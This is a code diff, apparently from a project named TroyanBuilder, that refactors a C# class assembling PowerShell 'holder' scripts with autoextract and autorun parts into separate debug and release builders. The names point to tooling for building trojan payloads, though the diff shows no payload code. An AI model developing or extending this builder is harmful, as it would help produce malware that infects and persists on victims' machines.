@@ -3,12 +3,10 @@ using System.Text.Json.Nodes;
 
 namespace TroyanBuilder;
 
-public class HolderBuilder: CustomBuilder
+public abstract class HolderBuilder: CustomBuilder
 {
     protected override string SourceDir => Path.Combine(Model.TroyanScriptDir, "holder");
     protected override string OutputFile => Model.Holder;
-    protected override string OutputReleaseFile => Model.HolderRelease;
-    protected override string OutputDebugFile => Model.HolderDebug;
 
     protected override string[] PrioritySources => new [] {"consts_body", "consts_autoextract", "utils"};
     protected override string[] PriorityTasks => new [] { "autorun" };
@@ -29,16 +27,22 @@ $xbody = ""__BODY""
         var outputPath = Path.Combine(Model.TroyanScriptDir, "holder", "consts_autoextract.ps1");
         File.WriteAllText(outputPath, template);
     }
-
-
-
-    protected override List<string> GetSourceFiles()
+    
+    protected override List<SourceFile> GetSourceFiles()
     {
-        var result = base.GetSourceFiles();
-        result.Add("consts_body");
-        result.Add("utils");
-        result = result.SortWithPriority(PrioritySources).ToList();
-        return result;
+        var sourceFiles = base.GetSourceFiles();
+        sourceFiles.Insert(0, new SourceFile(){Name = "utils"});
+        sourceFiles.Insert(0, new SourceFile(){Name = "consts_body"});
+        return sourceFiles;
     }
+}
 
+public class HolderBuilderDebug : HolderBuilder
+{
+    protected override string OutputFile => Model.HolderDebug;
+}
+
+public class HolderBuilderRelease : HolderBuilder
+{
+    protected override string OutputFile => Model.HolderRelease;
 }
